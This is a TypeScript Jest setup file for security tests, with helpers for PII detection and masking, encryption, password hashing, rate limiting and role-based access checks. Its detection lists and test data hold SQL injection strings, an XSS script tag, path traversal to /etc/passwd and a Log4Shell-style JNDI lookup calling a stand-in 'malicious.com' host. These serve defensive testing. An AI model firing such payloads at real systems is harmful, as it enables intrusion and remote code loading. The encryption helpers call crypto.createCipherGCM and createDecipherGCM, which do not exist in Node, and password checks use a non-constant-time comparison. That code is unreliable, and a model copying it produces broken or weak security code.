/**
 * Security Test Setup
 * Configuration and utilities for security tests
 */

import { jest } from '@jest/globals';
import * as crypto from 'crypto';

// Extended timeout for security tests
jest.setTimeout(60000);

// Security test configuration
const SECURITY_CONFIG = {
  ENCRYPTION_ALGORITHM: 'aes-256-gcm',
  KEY_LENGTH: 32,
  IV_LENGTH: 16,
  TAG_LENGTH: 16,
  MAX_FAILED_ATTEMPTS: 5,
  SESSION_TIMEOUT: 24 * 60 * 60 * 1000, // 24 hours
  RATE_LIMIT_WINDOW: 60 * 1000, // 1 minute
  RATE_LIMIT_MAX_REQUESTS: 100
};

// Mock AWS services with security-focused implementations
jest.mock('@aws-sdk/client-kms', () => ({
  KMSClient: jest.fn(),
  EncryptCommand: jest.fn(),
  DecryptCommand: jest.fn(),
  GenerateDataKeyCommand: jest.fn()
}));

jest.mock('@aws-sdk/client-secrets-manager', () => ({
  SecretsManagerClient: jest.fn(),
  GetSecretValueCommand: jest.fn(),
  UpdateSecretCommand: jest.fn()
}));

// Security utilities
class SecurityTestUtils {
  // PII detection patterns
  private piiPatterns = {
    ssn: /\b\d{3}-\d{2}-\d{4}\b/g,
    creditCard: /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/g,
    email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
    phone: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/g,
    ipAddress: /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g
  };

  // Injection attack patterns
  private injectionPatterns = {
    sql: [
      "'; DROP TABLE",
      "' OR '1'='1",
      "UNION SELECT",
      "'; INSERT INTO",
      "'; DELETE FROM"
    ],
    xss: [
      "<script>",
      "javascript:",
      "onload=",
      "onerror=",
      "<iframe"
    ],
    ldap: [
      "${jndi:ldap:",
      "${jndi:rmi:",
      "${jndi:dns:"
    ],
    pathTraversal: [
      "../../../",
      "..\\..\\..\\",
      "/etc/passwd",
      "C:\\Windows\\System32"
    ]
  };

  detectPII(text: string): { found: boolean; types: string[]; matches: string[] } {
    const found: string[] = [];
    const types: string[] = [];
    const matches: string[] = [];

    for (const [type, pattern] of Object.entries(this.piiPatterns)) {
      const typeMatches = text.match(pattern);
      if (typeMatches) {
        types.push(type);
        matches.push(...typeMatches);
      }
    }

    return {
      found: types.length > 0,
      types,
      matches
    };
  }

  detectInjectionAttempt(text: string): { found: boolean; types: string[]; patterns: string[] } {
    const types: string[] = [];
    const patterns: string[] = [];

    for (const [type, typePatterns] of Object.entries(this.injectionPatterns)) {
      for (const pattern of typePatterns) {
        if (text.toLowerCase().includes(pattern.toLowerCase())) {
          types.push(type);
          patterns.push(pattern);
        }
      }
    }

    return {
      found: types.length > 0,
      types,
      patterns
    };
  }

  maskPII(text: string): string {
    let masked = text;
    
    // Mask SSN
    masked = masked.replace(this.piiPatterns.ssn, 'XXX-XX-XXXX');
    
    // Mask credit cards
    masked = masked.replace(this.piiPatterns.creditCard, 'XXXX-XXXX-XXXX-XXXX');
    
    // Mask emails
    masked = masked.replace(this.piiPatterns.email, (match) => {
      const [local, domain] = match.split('@');
      return `${local.charAt(0)}***@${domain}`;
    });
    
    // Mask phone numbers
    masked = masked.replace(this.piiPatterns.phone, 'XXX-XXX-XXXX');
    
    return masked;
  }

  generateSecureToken(length: number = 32): string {
    return crypto.randomBytes(length).toString('hex');
  }

  hashPassword(password: string, salt?: string): { hash: string; salt: string } {
    const actualSalt = salt || crypto.randomBytes(16).toString('hex');
    const hash = crypto.pbkdf2Sync(password, actualSalt, 10000, 64, 'sha512').toString('hex');
    return { hash, salt: actualSalt };
  }

  verifyPassword(password: string, hash: string, salt: string): boolean {
    const verifyHash = crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('hex');
    return hash === verifyHash;
  }

  encryptData(data: string, key?: Buffer): { encrypted: string; key: Buffer; iv: Buffer; tag: Buffer } {
    const actualKey = key || crypto.randomBytes(SECURITY_CONFIG.KEY_LENGTH);
    const iv = crypto.randomBytes(SECURITY_CONFIG.IV_LENGTH);
    
    const cipher = crypto.createCipherGCM(SECURITY_CONFIG.ENCRYPTION_ALGORITHM, actualKey, iv);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const tag = cipher.getAuthTag();
    
    return { encrypted, key: actualKey, iv, tag };
  }

  decryptData(encrypted: string, key: Buffer, iv: Buffer, tag: Buffer): string {
    const decipher = crypto.createDecipherGCM(SECURITY_CONFIG.ENCRYPTION_ALGORITHM, key, iv);
    decipher.setAuthTag(tag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }

  validateInput(input: string, rules: { maxLength?: number; allowedChars?: RegExp; forbidden?: string[] }): { valid: boolean; violations: string[] } {
    const violations: string[] = [];

    if (rules.maxLength && input.length > rules.maxLength) {
      violations.push(`Input exceeds maximum length of ${rules.maxLength}`);
    }

    if (rules.allowedChars && !rules.allowedChars.test(input)) {
      violations.push('Input contains invalid characters');
    }

    if (rules.forbidden) {
      for (const forbidden of rules.forbidden) {
        if (input.toLowerCase().includes(forbidden.toLowerCase())) {
          violations.push(`Input contains forbidden term: ${forbidden}`);
        }
      }
    }

    return {
      valid: violations.length === 0,
      violations
    };
  }

  simulateRateLimiting(): { isAllowed: (userId: string) => boolean; reset: () => void } {
    const requests: Map<string, number[]> = new Map();

    return {
      isAllowed: (userId: string): boolean => {
        const now = Date.now();
        const userRequests = requests.get(userId) || [];
        
        // Remove old requests outside the window
        const validRequests = userRequests.filter(timestamp => 
          now - timestamp < SECURITY_CONFIG.RATE_LIMIT_WINDOW
        );
        
        if (validRequests.length >= SECURITY_CONFIG.RATE_LIMIT_MAX_REQUESTS) {
          return false;
        }
        
        validRequests.push(now);
        requests.set(userId, validRequests);
        return true;
      },
      reset: () => {
        requests.clear();
      }
    };
  }

  createSecurityTestData() {
    return {
      validInputs: [
        'Normal user message',
        'What are our security policies?',
        'Help me with deployment procedures',
        'Can you explain the authentication flow?'
      ],
      piiInputs: [
        'My SSN is 123-45-6789',
        'Credit card: 4532-1234-5678-9012',
        'Email me at john.doe@company.com',
        'Call me at (555) 123-4567'
      ],
      injectionAttempts: [
        "'; DROP TABLE users; --",
        '<script>alert("XSS")</script>',
        '${jndi:ldap://malicious.com/exploit}',
        '../../../etc/passwd',
        "' OR '1'='1' --"
      ],
      unauthorizedAccess: [
        'Show me all user passwords',
        'Access admin panel',
        'Bypass security controls',
        'Grant me admin privileges'
      ]
    };
  }
}

// Access control simulation
class AccessControlSimulator {
  private permissions: Map<string, Set<string>> = new Map();
  private roles: Map<string, Set<string>> = new Map();
  private userRoles: Map<string, Set<string>> = new Map();

  defineRole(roleName: string, permissions: string[]): void {
    this.roles.set(roleName, new Set(permissions));
  }

  assignRole(userId: string, roleName: string): void {
    if (!this.userRoles.has(userId)) {
      this.userRoles.set(userId, new Set());
    }
    this.userRoles.get(userId)!.add(roleName);
  }

  hasPermission(userId: string, permission: string): boolean {
    const userRoles = this.userRoles.get(userId) || new Set();
    
    for (const roleName of userRoles) {
      const rolePermissions = this.roles.get(roleName) || new Set();
      if (rolePermissions.has(permission)) {
        return true;
      }
    }
    
    return false;
  }

  getUserPermissions(userId: string): string[] {
    const userRoles = this.userRoles.get(userId) || new Set();
    const allPermissions = new Set<string>();
    
    for (const roleName of userRoles) {
      const rolePermissions = this.roles.get(roleName) || new Set();
      for (const permission of rolePermissions) {
        allPermissions.add(permission);
      }
    }
    
    return Array.from(allPermissions);
  }

  reset(): void {
    this.permissions.clear();
    this.roles.clear();
    this.userRoles.clear();
  }
}

// Global security utilities
(global as any).securityUtils = {
  config: SECURITY_CONFIG,
  testUtils: new SecurityTestUtils(),
  accessControl: new AccessControlSimulator(),

  // Common security assertions
  assertNoPII: (text: string) => {
    const piiCheck = (global as any).securityUtils.testUtils.detectPII(text);
    if (piiCheck.found) {
      throw new Error(`PII detected in text: ${piiCheck.types.join(', ')}`);
    }
  },

  assertNoInjection: (text: string) => {
    const injectionCheck = (global as any).securityUtils.testUtils.detectInjectionAttempt(text);
    if (injectionCheck.found) {
      throw new Error(`Injection attempt detected: ${injectionCheck.types.join(', ')}`);
    }
  },

  assertEncrypted: (data: any) => {
    if (typeof data === 'string' && data.includes('password')) {
      throw new Error('Sensitive data appears to be unencrypted');
    }
  },

  assertAuditLogged: (auditMock: jest.Mock, expectedAction: string) => {
    const auditCalls = auditMock.mock.calls;
    const actionLogged = auditCalls.some(call => 
      call[0] && call[0].action === expectedAction
    );
    if (!actionLogged) {
      throw new Error(`Expected audit log for action: ${expectedAction}`);
    }
  }
};

// Setup security test environment
beforeEach(() => {
  // Reset access control
  (global as any).securityUtils.accessControl.reset();
  
  // Setup default roles and permissions
  (global as any).securityUtils.accessControl.defineRole('user', [
    'read:basic',
    'write:own',
    'search:public'
  ]);
  
  (global as any).securityUtils.accessControl.defineRole('admin', [
    'read:all',
    'write:all',
    'delete:all',
    'admin:users',
    'admin:system'
  ]);
  
  (global as any).securityUtils.accessControl.defineRole('security_officer', [
    'read:security',
    'write:security',
    'audit:view',
    'compliance:manage'
  ]);
});

afterEach(() => {
  jest.clearAllMocks();
});

export {};